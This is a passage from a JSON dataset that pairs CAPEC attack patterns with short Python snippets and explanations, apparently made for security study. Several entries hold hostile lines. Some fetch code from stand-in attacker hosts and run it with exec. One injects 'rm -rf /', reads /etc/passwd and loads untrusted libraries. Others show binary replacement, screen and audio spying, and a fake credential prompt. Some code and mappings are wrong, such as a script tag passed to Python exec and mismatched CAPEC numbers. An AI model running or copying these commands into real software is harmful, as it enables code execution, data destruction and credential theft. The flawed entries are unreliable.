        "code_snippet": "import ctypes\nimport os\nimport sys\n\n# Vulnerable function to load a DLL from an untrusted source\n# CWE-114: Process Control\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\ndef load_untrusted_dll(dll_path):\n    try:\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded DLL from {dll_path}\")\n    except Exception as e:\n        print(f\"Failed to load DLL: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <path_to_dll>\")\n        sys.exit(1)\n\n    dll_path = sys.argv[1]\n    load_untrusted_dll(dll_path)\n",
        "description": "This Python code snippet demonstrates a vulnerable function that loads a DLL from an untrusted source, embodying the main idea of the CAPEC 'Inclusion of Code in Existing Process'. The function `load_untrusted_dll` uses the `ctypes` library to load a DLL specified by the user. This represents CWE-114 (Process Control) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it allows the execution of potentially malicious code from an untrusted source. An attacker could exploit this to inject arbitrary code into the address space of a running process, potentially leading to privilege escalation or evasion of detection defenses."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import os\nimport ctypes\n\n# Simulate a vulnerable application loading a DLL\n# This is a simplified example and should not be used in production\n\ndef load_dll(dll_name):\n    try:\n        # Attempt to load the DLL from the current directory\n        dll_path = os.path.join(os.getcwd(), dll_name)\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded {dll_name} from {dll_path}\")\n    except OSError as e:\n        print(f\"Failed to load {dll_name}: {e}\")\n\n# Vulnerable to DLL Side-Loading\n# An attacker can place a malicious 'example.dll' in the current directory\nload_dll('example.dll')",
        "description": "This Python code snippet demonstrates a simplified version of a DLL Side-Loading vulnerability. The `load_dll` function attempts to load a DLL named 'example.dll' from the current working directory using the `ctypes.CDLL` function. This approach is vulnerable because it does not specify a secure or trusted path for the DLL, allowing an attacker to place a malicious 'example.dll' in the current directory. This embodies the main idea of CAPEC-427 (DLL Side-Loading) and is related to CWE-426 (Untrusted Search Path) and CWE-427 (Uncontrolled Search Path Element). The code highlights the risk of loading resources from untrusted or improperly specified locations."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\n\n# Path to the binary that will be replaced\nbinary_path = '/usr/local/bin/target_binary'\n\n# Path to the malicious binary\nmalicious_binary_path = '/tmp/malicious_binary'\n\n# Check if the binary exists and has weak permissions\nif os.path.exists(binary_path) and os.access(binary_path, os.W_OK):\n    # Replace the binary with the malicious one\n    shutil.copy(malicious_binary_path, binary_path)\n    print(f'Replaced {binary_path} with malicious binary.')\nelse:\n    print(f'Cannot replace {binary_path}. Either it does not exist or lacks write permissions.')",
        "description": "This Python code snippet demonstrates a scenario where an attacker replaces a legitimate binary with a malicious one due to weak file permissions. The code first checks if the target binary exists and if it has write permissions. If both conditions are met, it replaces the target binary with a malicious binary. This embodies the CAPEC 'Replace Binaries' by exploiting CWE-732 (Incorrect Permission Assignment for Critical Resource). The code also indirectly touches on CWE-426 (Untrusted Search Path) and CWE-428 (Unquoted Search Path or Element) by assuming the binary is in a predictable location that can be manipulated."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-427: Uncontrolled Search Path Element\n# CWE-40: Path Traversal: '\\\\UNC\\share\\name\\' (Windows UNC Share)\n\ndef list_shared_directories(base_path):\n    try:\n        # CWE-40: Potentially unsafe handling of UNC paths\n        if base_path.startswith('\\\\'):  # UNC path check\n            print(f\"Scanning shared directory: {base_path}\")\n            for root, dirs, files in os.walk(base_path):\n                for name in dirs + files:\n                    full_path = os.path.join(root, name)\n                    print(f\"Found: {full_path}\")\n                    # CWE-200: Potential exposure of sensitive information\n                    with open(full_path, 'r') as f:\n                        print(f.read())  # Unsafe read operation\n    except Exception as e:\n        print(f\"Error accessing {base_path}: {e}\")\n\n# Example usage\nlist_shared_directories('\\\\UNC\\share\\name')",
        "description": "This Python code snippet demonstrates the identification and listing of shared directories on a system, specifically targeting Windows UNC paths. The function `list_shared_directories` takes a base path and attempts to list all directories and files within it. If the base path is a UNC path, it prints the paths of all found directories and files and reads their contents. This code embodies the CAPEC idea of identifying shared files/directories on a system and highlights several related CWEs: CWE-552 (making files or directories accessible to unauthorized actors), CWE-267 (performing unsafe actions with privileges), CWE-200 (exposing sensitive information), CWE-427 (uncontrolled search path element), and CWE-40 (handling of UNC paths). The code is vulnerable as it does not properly handle access control, potentially exposing sensitive information to unauthorized actors."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing password hashes\nstored_hashes = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # hash for 'password'\n}\n\n# Function to authenticate using password hash\ndef authenticate(username, password_hash):\n    if username in stored_hashes and stored_hashes[username] == password_hash:\n        return True\n    return False\n\n# Simulate an attacker capturing a hash\ncaptured_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\n\n# Attacker replays the captured hash\nif authenticate('user1', captured_hash):\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a simplified version of the 'Use of Captured Hashes (Pass The Hash)' attack. The code stores password hashes and uses them for authentication. An attacker captures a legitimate password hash and replays it to authenticate successfully. This example highlights the vulnerabilities associated with storing and using password hashes (CWE-522, CWE-836), the risks of single-factor authentication (CWE-308), and the potential for authentication bypass through capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport ssl\n\n# Simulate insecure storage of credentials\ncredentials = {'username': 'admin', 'password': 'password123'}\n\n# Simulate insecure transmission of credentials\ndef send_credentials(credentials):\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n\n    with socket.create_connection(('example.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n            ssock.sendall(f\"{credentials['username']}:{credentials['password']}\".encode())\n\n# Simulate capture-replay attack\ncaptured_ticket = \"captured_ticket_data\"\n\n# Simulate authentication bypass using captured ticket\ndef authenticate_with_ticket(ticket):\n    with socket.create_connection(('example.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n            ssock.sendall(ticket.encode())\n\n# Send credentials (insecurely)\nsend_credentials(credentials)\n\n# Authenticate using captured ticket\nauthenticate_with_ticket(captured_ticket)",
        "description": "This Python code snippet demonstrates the main idea of the CAPEC 'Use of Captured Tickets (Pass The Ticket)' by simulating insecure storage and transmission of credentials, and a capture-replay attack. The 'send_credentials' function sends credentials over an insecure SSL connection, which is susceptible to interception (CWE-522). The 'authenticate_with_ticket' function simulates an authentication bypass using a captured ticket (CWE-294). The code highlights the risks associated with insufficiently protected credentials and the potential for capture-replay attacks in systems using single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport winreg\n\n# Function to list USB devices from Windows Registry\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-67: Improper Handling of Windows Device Names\n\ndef list_usb_devices():\n    try:\n        reg_path = r'SYSTEM\\CurrentControlSet\\Enum\\USBSTOR'\n        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:\n            for i in range(0, winreg.QueryInfoKey(key)[0]):\n                device = winreg.EnumKey(key, i)\n                device_path = os.path.join(reg_path, device)\n                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, device_path) as subkey:\n                    for j in range(0, winreg.QueryInfoKey(subkey)[0]):\n                        sub_device = winreg.EnumKey(subkey, j)\n                        print(f'Found USB device: {sub_device}')\n    except Exception as e:\n        print(f'Error accessing registry: {e}')\n\n# Function to simulate malware reporting USB device connection\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n\ndef report_usb_connection(device_name):\n    # Simulate sending device information to an unauthorized actor\n    print(f'Reporting USB device: {device_name}')\n\n# Main function to demonstrate Peripheral Footprinting\n\ndef main():\n    list_usb_devices()\n    # Simulate finding a new USB device and reporting it\n    new_device = 'USB\\VID_1234&PID_5678'\n    report_usb_connection(new_device)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of Peripheral Footprinting by listing USB devices connected to a Windows system through the registry and simulating the reporting of a newly connected USB device. The `list_usb_devices` function accesses the Windows registry to enumerate USB devices, exposing sensitive system information (CWE-497, CWE-200). The `report_usb_connection` function simulates the behavior of malware reporting the presence of a USB device, representing the inclusion of undocumented features (CWE-1242). The code highlights how an adversary might gather information about peripheral devices to gain insights into the system for further attacks."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef collect_registry_data():\n    try:\n        registry_path = r'SOFTWARE\\SensitiveApp'\n        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_READ)\n        value, regtype = winreg.QueryValueEx(registry_key, 'SensitiveData')\n        winreg.CloseKey(registry_key)\n        return value\n    except Exception as e:\n        print(f'Error accessing registry: {e}')\n\nif __name__ == '__main__':\n    sensitive_data = collect_registry_data()\n    if sensitive_data:\n        print(f'Collected Sensitive Data: {sensitive_data}')",
        "description": "This Python code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to collect sensitive data. The function `collect_registry_data` attempts to read a value named 'SensitiveData' from a registry path 'SOFTWARE\\SensitiveApp'. If successful, it returns the sensitive data stored in cleartext. This code embodies the CAPEC idea of collecting data from registries by exploiting weaknesses such as improper authorization (CWE-285) and cleartext storage (CWE-314). The code does not include proper authorization checks, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport os\n\n# Function to capture screenshots\ndef capture_screenshots(interval, duration, save_path):\n    end_time = time.time() + duration\n    while time.time() < end_time:\n        screenshot = pyautogui.screenshot()\n        timestamp = int(time.time())\n        screenshot.save(os.path.join(save_path, f'screenshot_{timestamp}.png'))\n        time.sleep(interval)\n\n# Example usage\nif __name__ == '__main__':\n    save_path = './screenshots'\n    os.makedirs(save_path, exist_ok=True)\n    capture_screenshots(interval=5, duration=60, save_path=save_path)\n",
        "description": "This Python code snippet captures screenshots of the system's screen at regular intervals and saves them to a specified directory. The `capture_screenshots` function takes three parameters: `interval` (time between screenshots), `duration` (total time to capture screenshots), and `save_path` (directory to save screenshots). The code uses the `pyautogui` library to capture screenshots and the `time` library to manage intervals and duration. This code embodies the CAPEC 'Collect Data from Screen Capture' by demonstrating how an adversary could exploit screen capture functionality to gather sensitive information over time. The related CWEs provide context on potential vulnerabilities, such as improper privilege management (CWE-267), exposure of sensitive information (CWE-497), and cleartext transmission (CWE-319), which could be leveraged in conjunction with screen capture to further compromise system security."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\n# Function to check file extension\ndef is_safe_file(file_path):\n    allowed_extensions = ['.txt', '.jpg', '.png']\n    file_extension = os.path.splitext(file_path)[1]\n    if file_extension in allowed_extensions:\n        return True\n    return False\n\n# Example usage\nfile_path = 'example.txt '\nif is_safe_file(file_path):\n    print('File is safe to process.')\nelse:\n    print('File is not safe to process.')",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Adding a Space to a File Extension'. The function `is_safe_file` checks if a file has an allowed extension by splitting the file path and comparing the extension against a list of allowed extensions. However, the code does not properly handle trailing spaces in the file extension, which can be exploited by an attacker. For example, a file named 'example.txt ' (with a trailing space) would bypass the check and be considered safe, even though it might not be. This represents CWE-46 (Path Equivalence: 'filename '), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and other related weaknesses by demonstrating how improper validation of file paths and extensions can lead to security issues."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\nfrom flask import Flask, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            return 'No file part'\n        file = request.files['file']\n        # If the user does not select a file, the browser submits an empty file without a filename\n        if file.filename == '':\n            return 'No selected file'\n        # Save the file to the upload folder\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        return 'File successfully uploaded'\n    return '''\n    <!doctype html>\n    <title>Upload new File</title>\n    <h1>Upload new File</h1>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic file upload functionality using the Flask web framework. The code allows users to upload files to a specified directory on the server. The main idea of the CAPEC 'Upload a Web Shell to a Web Server' is represented here, as an attacker could exploit this functionality to upload a malicious web shell. The related CWEs are also reflected in the code: CWE-434 (Unrestricted Upload of File with Dangerous Type) is evident as there is no restriction on the type of file being uploaded, CWE-287 (Improper Authentication) is implied as there is no authentication mechanism to verify the identity of the uploader, and CWE-553 (Command Shell in Externally Accessible Directory) could be exploited if the upload directory is accessible and the uploaded file is a shell script. This code snippet highlights the potential security risks associated with improper handling of file uploads."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport numpy as np\nimport scipy.io.wavfile as wav\n\n# Record audio for 10 seconds\nfs = 44100  # Sample rate\nseconds = 10  # Duration of recording\nprint('Recording...')\nmyrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)\nsd.wait()  # Wait until recording is finished\nprint('Recording finished')\n\n# Save the recording to a file\nwav.write('eavesdropped_audio.wav', fs, myrecording)\n\n# Simulate exposure of sensitive information\nwith open('eavesdropped_audio.wav', 'rb') as f:\n    audio_data = f.read()\n\n# Transmit the audio data in cleartext (vulnerable to interception)\nprint('Transmitting audio data...')\n# Here we would normally send the data over a network, but for simplicity, we just print it\nprint(audio_data)",
        "description": "This Python code snippet demonstrates a basic eavesdropping scenario where audio is recorded using a microphone and then saved to a file. The recorded audio is then read from the file and transmitted in cleartext, which is vulnerable to interception. This embodies the main idea of CAPEC-173 (Eavesdropping) by capturing and exposing sensitive information (audio conversation) without proper authorization. The code also highlights related CWEs such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Simulate a Kerberos authentication request\nserver_address = ('example.com', 88)\n\n# Create a socket and wrap it with SSL for secure communication\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = ssl.wrap_socket(sock)\n\ntry:\n    ssl_sock.connect(server_address)\n    # CWE-522: Sending credentials in plaintext (simulated)\n    kerberos_ticket = 'TGT-12345'  # Simulated Kerberos Ticket\n    ssl_sock.sendall(kerberos_ticket.encode('utf-8'))\n    \n    # CWE-294: Capture-replay vulnerability\n    # An attacker could capture this ticket and replay it\n    response = ssl_sock.recv(1024)\n    print('Received:', response.decode('utf-8'))\nfinally:\n    ssl_sock.close()",
        "description": "This Python code snippet simulates a Kerberos authentication request to a server. It demonstrates several vulnerabilities related to the CAPEC 'Use of Known Kerberos Credentials'. The code connects to a server using SSL for secure communication but sends a simulated Kerberos ticket in plaintext, representing CWE-522 (Insufficiently Protected Credentials). The use of a single Kerberos ticket for authentication highlights CWE-308 (Use of Single-factor Authentication). Additionally, the code is vulnerable to capture-replay attacks (CWE-294), where an attacker could capture the Kerberos ticket and replay it to gain unauthorized access. This snippet embodies the main idea of the CAPEC by showing how an adversary could exploit known Kerberos credentials to achieve authenticated access to a system."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import os\nimport getpass\n\n# Hardcoded credentials (CWE-522)\nUSERNAME = 'admin'\nPASSWORD = 'password123'\n\n# Function to authenticate user\ndef authenticate(username, password):\n    # Single-factor authentication (CWE-308)\n    if username == USERNAME and password == PASSWORD:\n        print('Authentication successful!')\n        return True\n    else:\n        print('Authentication failed!')\n        return False\n\n# Main function\nif __name__ == '__main__':\n    # Get credentials from user\n    user = input('Enter username: ')\n    pwd = getpass.getpass('Enter password: ')\n\n    # Attempt to authenticate\n    if authenticate(user, pwd):\n        # Simulate authorized action\n        print('Performing authorized action...')\n    else:\n        print('Access denied.')",
        "description": "This Python code snippet demonstrates a simple authentication mechanism that embodies the main idea of CAPEC-Use of Known Operating System Credentials. The code uses hardcoded credentials (CWE-522) and single-factor authentication (CWE-308) to authenticate a user. The user is prompted to enter a username and password, which are then checked against the hardcoded values. If the credentials match, the user is authenticated and an authorized action is performed. This code is vulnerable because it relies on hardcoded credentials and single-factor authentication, making it susceptible to unauthorized access if the credentials are guessed or obtained by an adversary."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import simpledialog\n\n# CWE-798: Use of Hard-coded Credentials\nHARDCODED_USERNAME = 'admin'\nHARDCODED_PASSWORD = 'password123'\n\n# Function to simulate credential prompt impersonation\ndef fake_credential_prompt():\n    root = tk.Tk()\n    root.withdraw()  # Hide the main window\n\n    # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n    # Display a fake credential prompt\n    username = simpledialog.askstring('Login', 'Enter your username:')\n    password = simpledialog.askstring('Login', 'Enter your password:', show='*')\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Here, credentials are simply printed, but in a real attack, they would be sent to an attacker\n    print(f'Captured credentials - Username: {username}, Password: {password}')\n\n    # CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n    # This is a simulation, so no actual ASP.NET misconfiguration is shown\n    # CWE-1391: Use of Weak Credentials\n    # The hardcoded credentials are weak and easily guessable\n    if username == HARDCODED_USERNAME and password == HARDCODED_PASSWORD:\n        print('Access granted with hardcoded credentials')\n    else:\n        print('Access denied')\n\nif __name__ == '__main__':\n    fake_credential_prompt()",
        "description": "This Python code snippet demonstrates a simple GUI-based credential prompt impersonation attack using the Tkinter library. The code creates a fake login prompt to capture user credentials. It highlights several security weaknesses:\n\n1. **CWE-798: Use of Hard-coded Credentials** - The code uses hard-coded credentials for authentication.\n2. **CWE-1021: Improper Restriction of Rendered UI Layers or Frames** - The fake credential prompt is displayed without proper UI layer restrictions, leading to potential user confusion.\n3. **CWE-522: Insufficiently Protected Credentials** - Captured credentials are printed to the console, simulating insecure handling of sensitive information.\n4. **CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation** - Although not directly shown, the concept of impersonation is simulated by checking against hard-coded credentials.\n5. **CWE-1391: Use of Weak Credentials** - The hard-coded credentials are weak and easily guessable.\n\nThe main idea of the CAPEC is to demonstrate how an adversary can impersonate a credential prompt to steal user credentials, leveraging various security weaknesses to achieve this goal."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-541: Inclusion of Sensitive Information in an Include File\n# CWE-532: Insertion of Sensitive Information into Log File\n\n# Create a temporary file insecurely\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file_name = temp_file.name\n    # CWE-541: Including sensitive information in the file\n    temp_file.write(b'username=admin\\npassword=secret\\n')\n\n# CWE-434: Allowing upload of a dangerous file type\nuploaded_file_name = 'malicious_script.sh'\nwith open(uploaded_file_name, 'w') as uploaded_file:\n    uploaded_file.write('#!/bin/bash\\necho \"Malicious code execution\"\\n')\n\n# CWE-532: Inserting sensitive information into a log file\nlog_file_name = 'application.log'\nwith open(log_file_name, 'a') as log_file:\n    log_file.write(f'User admin logged in with password secret\\n')\n\n# CAPEC: Avoid Security Tool Identification by Adding Data\n# Adding large amount of data to change file hash and avoid detection\nwith open(uploaded_file_name, 'a') as uploaded_file:\n    uploaded_file.write('A' * 10**6)  # Add 1MB of data to the file\n\nprint(f'Temporary file created: {temp_file_name}')\nprint(f'Uploaded file created: {uploaded_file_name}')\nprint(f'Log file updated: {log_file_name}')",
        "description": "This Python code snippet demonstrates several security weaknesses and the main idea of the CAPEC. It creates an insecure temporary file (CWE-377) and includes sensitive information in it (CWE-541). It then allows the upload of a dangerous file type (CWE-434) and logs sensitive information (CWE-532). Finally, it adds a large amount of data to the uploaded file to change its hash and avoid detection by security tools, embodying the main idea of the CAPEC 'Avoid Security Tool Identification by Adding Data'."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import random\n\nclass VoicePhishingSimulator:\n    def __init__(self):\n        self.valid_users = {'user1': 'password123', 'user2': 'passw0rd'}\n        self.sensitive_info = {'user1': 'SSN123-45-6789', 'user2': 'SSN987-65-4321'}\n\n    def simulate_call(self, user):\n        if user in self.valid_users:\n            print(f\"Simulating call to {user}...\")\n            self.request_credentials(user)\n        else:\n            print(\"Invalid user.\")\n\n    def request_credentials(self, user):\n        # CWE-940: No verification of the source of the call\n        print(\"Please provide your password:\")\n        provided_password = input()\n        if self.valid_users[user] == provided_password:\n            self.provide_sensitive_info(user)\n        else:\n            print(\"Incorrect password.\")\n\n    def provide_sensitive_info(self, user):\n        # CWE-359: Exposure of private personal information\n        print(f\"Your sensitive information: {self.sensitive_info[user]}\")\n\n# Simulate a voice phishing attack\nphishing_simulator = VoicePhishingSimulator()\nphishing_simulator.simulate_call('user1')",
        "description": "This Python code snippet simulates a voice phishing attack. The `VoicePhishingSimulator` class contains a list of valid users and their sensitive information. The `simulate_call` method simulates a call to a user, and the `request_credentials` method asks for the user's password without verifying the source of the call (CWE-940). If the provided password matches the stored password, the `provide_sensitive_info` method exposes the user's sensitive information (CWE-359). This code demonstrates how an attacker could solicit sensitive information from a user by masquerading as a legitimate entity over a voice call."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\n\n# URL of the malicious update server\nmalicious_update_url = 'http://malicious-server.com/update'\n\n# Function to download and execute the update\ndef download_and_execute_update(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download update')\n\n# Simulate a spoofed update trigger\nspoofed_update_trigger = '<script>download_and_execute_update(\"' + malicious_update_url + '\")</script>'\n\n# Execute the spoofed update trigger\nexec(spoofed_update_trigger)",
        "description": "This Python code snippet demonstrates a malicious automated software update via spoofing. The code simulates a scenario where an attacker tricks a client into downloading and executing a malicious update from a spoofed source. The 'download_and_execute_update' function downloads code from a specified URL and executes it without verifying its integrity or origin (CWE-494). The 'spoofed_update_trigger' simulates a cross-site scripting (XSS) attack (CWE-79) that triggers the malicious update. This snippet embodies the main idea of CAPEC-494 by showing how an attacker can use spoofing to deliver and execute malicious code on a client system."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious.example.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)  # Dangerous: executing code without integrity check\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nimport ctypes\nctypes.CDLL('/path/to/untrusted/library.so')  # Dangerous: loading untrusted library\n\n# CWE-78: OS Command Injection\nuser_input = 'some_input; rm -rf /'\nos.system(f'echo {user_input}')  # Dangerous: OS command injection\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.popen('cat /etc/passwd').read()  # Dangerous: exposing sensitive system info\nprint(sensitive_info)\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\ndef custom_url_handler(url):\n    if url.startswith('customscheme://'):\n        # Dangerous: no proper authorization check\n        print('Handling custom URL scheme')\n\ncustom_url_handler('customscheme://malicious_action')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Root/Jailbreak Detection Evasion via Hooking' and the associated CWEs. The code includes:\n\n1. **CWE-494: Download of Code Without Integrity Check** - The code downloads and executes a script from a remote URL without verifying its integrity, allowing arbitrary code execution.\n2. **CWE-829: Inclusion of Functionality from Untrusted Control Sphere** - The code loads a shared library from an untrusted source, which could contain malicious code.\n3. **CWE-78: OS Command Injection** - The code constructs and executes an OS command using user input without proper sanitization, leading to potential command injection.\n4. **CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere** - The code reads and prints sensitive system information, exposing it to unauthorized actors.\n5. **CWE-939: Improper Authorization in Handler for Custom URL Scheme** - The code handles a custom URL scheme without proper authorization checks, allowing unauthorized actions.\n\nThese vulnerabilities illustrate how an adversary could exploit weaknesses in a mobile application to evade Root/Jailbreak detection and perform malicious actions."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\ndef is_debugger_present():\n    return ctypes.windll.kernel32.IsDebuggerPresent() != 0\n\ndef check_root_jailbreak():\n    # Check for common root/jailbreak indicators\n    root_indicators = ['/system/bin/su', '/system/xbin/su', '/system/app/Superuser.apk']\n    for indicator in root_indicators:\n        if os.path.exists(indicator):\n            return True\n    return False\n\ndef main():\n    if is_debugger_present():\n        print('Debugger detected! Exiting...')\n        sys.exit(1)\n    if check_root_jailbreak():\n        print('Root/Jailbreak detected! Exiting...')\n        sys.exit(1)\n    print('Application running normally.')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic implementation of root/jailbreak detection and debugger presence check, which are common security measures in mobile applications. The `is_debugger_present` function uses the Windows API to check if a debugger is attached to the process, while the `check_root_jailbreak` function looks for common indicators of a rooted or jailbroken device. If either condition is detected, the application exits. This code embodies the main idea of CAPEC-Root/Jailbreak Detection Evasion via Debugging by showing how an adversary might attempt to bypass these checks to gain unauthorized access or control. The related CWEs highlight potential weaknesses such as active debug code (CWE-489) and exposure of sensitive system information (CWE-497), which this code aims to mitigate."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# Simulating a man-in-the-middle attack by intercepting and modifying traffic\nclass MITMProxy:\n    def intercept(self, data):\n        # Malicious modification of data\n        return data.replace('safe', 'malicious')\n\nproxy = MITMProxy()\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Client-side validation that can be bypassed\nuser_input = input('Enter your username: ')\nif '<script>' in user_input:\n    print('Invalid input')\nelse:\n    print('Welcome, ' + user_input)\n\n# CWE-368: Context Switching Race Condition\nimport threading\nimport time\n\nshared_resource = 0\n\n# Function to simulate context switching race condition\ndef race_condition():\n    global shared_resource\n    local_copy = shared_resource\n    time.sleep(0.1)  # Simulate context switch\n    shared_resource = local_copy + 1\n\nthreads = [threading.Thread(target=race_condition) for _ in range(10)]\nfor thread in threads:\n    thread.start()\nfor thread in threads:\n    thread.join()\n\nprint('Final value of shared_resource:', shared_resource)\n\n# CWE-506: Embedded Malicious Code\n# Simulating embedded malicious code\nexec('print(\"This is a malicious code execution\")')",
        "description": "This Python code snippet demonstrates several security vulnerabilities that align with the CAPEC 'Adversary in the Browser (AiTB)'. The code includes:\n\n1. CWE-494: Download of Code Without Integrity Check - The script downloads and executes code from a remote location without verifying its integrity.\n2. CWE-300: Channel Accessible by Non-Endpoint - A class simulates a man-in-the-middle attack by intercepting and modifying data.\n3. CWE-602: Client-Side Enforcement of Server-Side Security - The script performs client-side validation that can be easily bypassed.\n4. CWE-368: Context Switching Race Condition - The script demonstrates a race condition by manipulating a shared resource across multiple threads.\n5. CWE-506: Embedded Malicious Code - The script contains an example of executing embedded malicious code.\n\nThese vulnerabilities illustrate how an adversary can exploit browser security flaws to manipulate traffic and compromise security between endpoints."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import numpy as np\n\n# Simulate speculative execution by accessing array out of bounds\narray_size = 10\nsecret_data = np.random.randint(0, 256, size=array_size)\npublic_data = np.zeros(array_size)\n\n# Function to simulate speculative execution\ndef speculative_execution(index):\n    if index < array_size:\n        return secret_data[index]\n    else:\n        return public_data[index % array_size]\n\n# Simulate branch prediction and speculative execution\nfor i in range(20):\n    index = np.random.randint(0, 20)\n    result = speculative_execution(index)\n    print(f\"Accessing index {index}: {result}\")",
